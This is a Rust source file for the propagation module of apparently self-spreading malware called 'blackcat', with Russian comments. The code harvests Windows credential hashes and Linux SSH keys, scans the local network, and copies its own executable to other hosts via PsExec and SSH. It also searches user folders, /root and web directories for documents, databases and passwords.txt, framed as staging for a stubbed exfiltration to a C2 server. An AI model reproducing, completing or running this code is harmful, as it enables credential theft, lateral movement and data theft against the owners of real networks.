// src/propagator.rs
use crate::lateral_movement::LateralMovement;
use crate::linux::LinuxOperations;
use log::{info, warn, error};

pub struct Propagator;

impl Propagator {
    pub fn execute_lateral_movement() -> Result<(), Box<dyn std::error::Error>> {
        #[cfg(target_os = "windows")]
        {
            info!("Starting Windows lateral movement...");
            
            // 1. Собираем учетные данные
            let credentials = LateralMovement::harvest_credentials();
            
            // 2. Обнаруживаем хосты в сети
            let hosts = LateralMovement::discover_hosts("192.168.1"); // Пример сети
            
            // 3. Распространяемся
            for (user, hash, domain) in credentials {
                info!("Attempting lateral movement with {}@{}", user, domain);
                
                let payload_path = std::env::current_exe()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_else(|_| "blackcat.exe".to_string());
                
                let _ = LateralMovement::spread_via_psexec(
                    hosts.clone(),
                    &payload_path,
                    &user,
                    &hash
                );
            }
        }
        
        #[cfg(target_os = "linux")]
        {
            info!("Starting Linux lateral movement...");
            
            // 1. Собираем SSH ключи
            let ssh_keys = LinuxOperations::harvest_ssh_keys()
                .unwrap_or_else(|e| {
                    warn!("Failed to harvest SSH keys: {}", e);
                    Vec::new()
                });
                
            if !ssh_keys.is_empty() {
                info!("Found {} SSH keys", ssh_keys.len());
                
                // 2. Обнаруживаем хосты в сети
                let hosts = LinuxOperations::discover_network_hosts()
                    .unwrap_or_else(|e| {
                        warn!("Failed to discover network hosts: {}", e);
                        Vec::new()
                    });
                    
                if !hosts.is_empty() {
                    info!("Found {} potential target hosts", hosts.len());
                    
                    // 3. Распространяемся
                    let payload_path = std::env::current_exe()
                        .map(|p| p.to_string_lossy().to_string())
                        .unwrap_or_else(|_| "./blackcat".to_string());
                    
                    let _ = LateralMovement::spread_via_ssh(
                        hosts,
                        &payload_path,
                        ssh_keys
                    );
                }
            }
        }
        
        Ok(())
    }
    
    // Функция для Data Exfiltration (имитация)
    pub fn exfiltrate_data() -> Result<(), Box<dyn std::error::Error>> {
        info!("Starting data exfiltration...");
        
        // Собираем чувствительные данные
        let sensitive_data = Self::collect_sensitive_data();
        
        // Имитация отправки на C2 сервер
        // В реальном сценарии здесь был бы HTTPS/Tor запрос
        info!("Collected {} sensitive files", sensitive_data.len());
        info!("Data would be exfiltrated to C2 server");
        
        Ok(())
    }
    
    fn collect_sensitive_data() -> Vec<String> {
        let mut files = Vec::new();
        
        #[cfg(target_os = "windows")]
        {
            let paths = vec![
                "C:\\Users\\*\\Documents\\*.docx",
                "C:\\Users\\*\\Desktop\\*.xlsx",
                "C:\\Users\\*\\*.pdf",
                "C:\\Users\\*\\*.txt",
                "C:\\Users\\*\\Desktop\\passwords.txt",
            ];
            
            // Используем PowerShell для поиска
            use std::process::Command;
            for pattern in paths {
                let output = Command::new("powershell")
                    .args(&["-Command", &format!("Get-ChildItem -Path '{}' -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName", pattern)])
                    .output();
                    
                if let Ok(result) = output {
                    let stdout = String::from_utf8_lossy(&result.stdout);
                    files.extend(stdout.lines().map(|s| s.to_string()));
                }
            }
        }
        
        #[cfg(target_os = "linux")]
        {
            let extensions = vec!["pdf", "docx", "xlsx", "txt", "sql", "db"];
            let locations = vec!["/home", "/var/www", "/opt", "/root"];
            
            for ext in extensions {
                for loc in &locations {
                    let output = std::process::Command::new("find")
                        .args(&[loc, "-name", &format!("*.{}", ext), "-type", "f"])
                        .output();
                        
                    if let Ok(result) = output {
                        let stdout = String::from_utf8_lossy(&result.stdout);
                        files.extend(stdout.lines().map(|s| s.to_string()));
                    }
                }
            }
        }
        
        files
    }
}